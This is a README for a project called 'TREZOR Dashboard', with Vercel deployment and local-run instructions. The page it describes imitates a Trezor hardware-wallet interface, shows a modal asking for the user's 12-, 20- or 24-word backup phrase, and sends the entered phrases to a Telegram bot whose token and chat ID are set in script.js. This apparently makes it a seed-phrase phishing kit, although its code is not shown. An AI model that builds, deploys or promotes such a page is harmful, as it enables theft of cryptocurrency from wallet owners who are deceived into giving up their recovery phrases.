# TREZOR Dashboard

A modern dashboard interface for TREZOR devices with Telegram integration.

## Files

- `index.html` - Main HTML file
- `styles.css` - All styling
- `script.js` - JavaScript functionality and Telegram integration
- `vercel.json` - Vercel deployment configuration
- `package.json` - Project metadata

## Deployment to Vercel

### Option 1: Using Vercel CLI

1. Install Vercel CLI:
   ```bash
   npm i -g vercel
   ```

2. Navigate to the project folder:
   ```bash
   cd trezor-dashboard-vercel
   ```

3. Deploy:
   ```bash
   vercel
   ```

4. Follow the prompts to complete deployment

### Option 2: Using Vercel Dashboard

1. Go to [vercel.com](https://vercel.com)
2. Sign in or create an account
3. Click "New Project"
4. Import your Git repository or drag and drop the project folder
5. Vercel will automatically detect the configuration
6. Click "Deploy"

## Features

- Dark-themed TREZOR dashboard interface
- Backup phrase input modal (12, 20, or 24 words)
- Telegram bot integration for receiving backup phrases
- Responsive design

## Configuration

The Telegram bot token and chat ID are configured in `script.js`:
- `TELEGRAM_BOT_TOKEN` - Your bot token
- `TELEGRAM_CHAT_ID` - Your chat ID

## Local Development

To run locally:
```bash
python3 -m http.server 8000
```

Then open `http://localhost:8000` in your browser.

